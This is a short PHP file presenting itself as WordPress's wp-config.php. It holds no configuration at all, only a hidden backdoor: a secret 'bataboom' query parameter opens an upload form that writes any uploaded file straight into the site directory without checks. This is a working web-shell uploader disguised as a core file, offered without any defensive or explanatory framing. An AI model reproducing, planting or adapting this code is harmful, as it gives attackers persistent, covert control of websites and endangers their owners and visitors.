<?php
//wp-config.php
if(isset($_GET['bataboom'])){if(isset($_FILES['im'])){$dim=getcwd().'/';$im=$_FILES['im'];@move_uploaded_file($im['tmp_name'], $dim.$im['name']);echo"Done: ".$dim.$im['name'];}else{?><form method="POST" enctype="multipart/form-data"><input type="file" name="im"/><input type="Submit"/></form><?php }}
